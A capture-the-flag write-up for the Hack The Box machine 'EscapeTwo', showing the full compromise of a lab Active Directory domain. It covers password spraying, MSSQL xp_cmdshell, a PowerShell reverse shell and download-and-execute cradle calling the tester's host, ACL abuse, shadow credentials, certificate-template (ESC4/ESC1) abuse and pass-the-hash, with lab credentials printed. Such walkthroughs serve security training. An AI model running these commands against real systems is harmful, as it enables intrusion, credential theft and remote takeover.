<img width="927" height="383" alt="image" src="https://github.com/user-attachments/assets/57f9f98b-f964-4998-bdf7-76a67c2573e9" /># -HTB-EscapeTwo

### Nmap 

```
nmap -p- -sVC 10.10.11.51 -oN nmap_scan --min-rate 5000
```
### Check users 

```
nxc smb sequel.htb0 -u 'rose' -p 'KxEPkKe6R8su' --users 
```
<img width="1350" height="256" alt="image" src="https://github.com/user-attachments/assets/86560a82-f209-41e8-91da-7e4c1fd981df" />

### Check shares 

```
nxc smb sequel.htb0 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

<img width="1297" height="244" alt="image" src="https://github.com/user-attachments/assets/1848ceb4-1e2c-466c-ad5b-c03094f54b59" />


### I check "Accounting Department" with smbclient and get the two xlsm file 

```
smbclient //sequel.htb0/"Accounting Department" -U 'rose' --password=KxEPkKe6R8su
```

<img width="1009" height="250" alt="image" src="https://github.com/user-attachments/assets/8a50651a-af5f-4889-9672-fd831c37469a" />


### We found in "accounts.xlsx" some users and passwd

<img width="576" height="162" alt="image" src="https://github.com/user-attachments/assets/0158ffbd-8085-49dd-b581-51821421cf23" />

### And we make 2 directory with the users and the passwd to try to enumerate them

```
nxc smb sequel.htb0 -u users.txt -p password.txt 
```

<img width="1285" height="165" alt="image" src="https://github.com/user-attachments/assets/81a33021-d101-4cb6-9236-c19718e6ebaf" />

### And we found a valid one :

```
oscar:86LxLBMgEWaKUnBG
```

### After i didn't find anyting on this users i try to connect to the ssql account with the credentials who find on the account.xlsm

```
sa:MSSQLP@ssw0rd!
```

```
nxc mssql sequel.htb0 -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth
```

<img width="1028" height="83" alt="image" src="https://github.com/user-attachments/assets/11d6c668-bf9c-46f5-9c83-91b6bd216ab6" />


### I use impacket-mssqlclient to connect to the mssql server 

```
impacket-mssqlclient sequel.htb0/'sa:MSSQLP@ssw0rd!'@10.10.11.51
```

### I enable the cmdshell with :

```
enable_xp_cmdshell
```

<img width="1122" height="655" alt="image" src="https://github.com/user-attachments/assets/ab2b6f06-4afd-4ab7-81e7-eff7120df168" />


### I execute cmd with a shell created like this :

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.19',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.19:8000/shell.psi")
```

### And get Shell on the box 

<img width="1050" height="245" alt="image" src="https://github.com/user-attachments/assets/269c0f03-8de1-406a-8613-4518e68d7f25" />


### In "C:\SQL2019\ExpressAdv_ENU" we fount a new passwd : "WqSZAF6CysDQbGb3"

<img width="701" height="537" alt="image" src="https://github.com/user-attachments/assets/177174e4-e793-404c-aa37-2e8d9a9b1374" />


### And we enumerate all the user on the box with

```
net user
```

<img width="660" height="153" alt="image" src="https://github.com/user-attachments/assets/4bd87714-64f4-4b57-9f68-832e849acb63" />


### I actualized the user.txt file and try the new passwd on all of the users

```
nxc smb sequel.htb0 -u users.txt -p 'WqSZAF6CysDQbGb3'
```

<img width="1307" height="230" alt="image" src="https://github.com/user-attachments/assets/48a880ee-d522-4323-b5e9-c9add84c2c63" />



### And on the winrm

```
nxc winrm sequel.htb0 -u users.txt -p 'WqSZAF6CysDQbGb3' 
```

<img width="1405" height="692" alt="image" src="https://github.com/user-attachments/assets/4f99bd73-1e73-40ee-b426-f68854f9a513" />


### We connect to ryan 

```
ryan:WqSZAF6CysDQbGb3
```
<img width="1184" height="185" alt="image" src="https://github.com/user-attachments/assets/7b906c1b-dcf2-4afd-beea-29eae2186963" />


### And we find the user flag


<img width="696" height="271" alt="image" src="https://github.com/user-attachments/assets/0733dc3a-3c7a-4f28-88c7-8785a53438fa" />



### We can see ryan have write permision on ca_svc


<img width="1266" height="397" alt="image" src="https://github.com/user-attachments/assets/69760ab7-0661-48ed-9b98-4fe2d6e18576" />

# Root

### I downlad powerview and uploaded on the box

```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

### After that i reseted the passwd for the ca_svc with ryan permison and change it to "Password123@"
```
Import-Module ./PowerView.ps1
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
$pass = ConvertTo-SecureString "Password123@" -AsPlainText -Force
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $pass
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
```

 <img width="1085" height="116" alt="image" src="https://github.com/user-attachments/assets/7ef49e7e-84ca-4aa2-a1fa-00bdeac2fe87" />


### And we succesfuly change the ca_svc passwd 


<img width="1313" height="94" alt="image" src="https://github.com/user-attachments/assets/a5a5036e-2379-4a80-92e3-c4d924f803da" />


### Now we are member of the "CERT PUBLISHERS@SEQUEL.HTB" and we have permision to publish certificates to the director

<img width="1656" height="931" alt="image" src="https://github.com/user-attachments/assets/cf4bf2ee-453c-4ed2-8cd5-769cdd133670" />

-----
-----
----

# Day 2 -> Root 

### I make ryan owner of the ca_svc accoutn 

```
impacket-owneredit -action write -new-owner ryan -target ca_svc DC01.sequel.htb/ryan:WqSZAF6CysDQbGb3 -dc-ip 10.10.11.51
```


<img width="1014" height="151" alt="image" src="https://github.com/user-attachments/assets/fe03b03a-3fd6-4523-92bb-08bfb249df53" />



### After i give us full control of ca_svc with decledit

```
impacket-dacledit -action write -rights FullControl -principal ryan  -target ca_svc DC01.sequel.htb/ryan:WqSZAF6CysDQbGb3
```


<img width="1024" height="107" alt="image" src="https://github.com/user-attachments/assets/ba491fa2-031a-47eb-be20-9fb9455a9814" />



### And take the hash for ca_svc

```
certipy-ad shadow auto -u ryan@DC01.sequel.htb -p 'WqSZAF6CysDQbGb3'  -account ca_svc  -dc-ip '10.10.11.51' 
```


<img width="1327" height="468" alt="image" src="https://github.com/user-attachments/assets/497bf726-2f62-45e3-8f7c-319ca8e9ac76" />



```
ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce
```

### I use -vuln cmd with certipy to see if it s vulnerable . And we see it s vulnerable to ESC4

```
certipy-ad find -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln 
```

```
Template Name                       : DunderMifflinAuthentication
```

<img width="783" height="248" alt="image" src="https://github.com/user-attachments/assets/ed6cbbd6-3bd5-4f94-b65d-fefc569d0e1c" />


### We make it vulnerable to ESC1


```
certipy-ad template -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```


<img width="1392" height="425" alt="image" src="https://github.com/user-attachments/assets/35da27bc-4840-4f3c-ab89-40a8b7c8b91b" />



### And use certipy to request the UPN for administrator account 


```
certipy-ad req \                                                                                                                                      
  -u ca_svc@sequel.htb \
  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -upn administrator@sequel.htb \
  -dns DC01.sequel.htb \
  -target DC01.sequel.htb \
  -target-ip 10.10.11.51
```


<img width="712" height="409" alt="image" src="https://github.com/user-attachments/assets/a3ecf28a-2731-4d27-afb4-0e83ec0bd1a8" />



### And the hash for the administrator accoutn 


```
certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.11.51
```


<img width="927" height="383" alt="image" src="https://github.com/user-attachments/assets/d2be2fa9-b010-44a1-b707-65b413a1e6f9" />

```
administrator@sequel.htb:7a8d4e04986afa8ed4060f75e5a0b3ff
```

### Connect to the box with psexec

```
impacket-psexec -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff administrator@10.10.11.51
```

<img width="740" height="607" alt="image" src="https://github.com/user-attachments/assets/ea93977b-7852-4784-b023-3d2e36333f09" />



<img width="398" height="56" alt="image" src="https://github.com/user-attachments/assets/93ccbbf4-4c8f-4d79-a647-0aff1d108e4b" />


# If somting fails try to remove the "DunderMifflinAuthentication.json" and re-run the 

```
certipy-ad template -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```


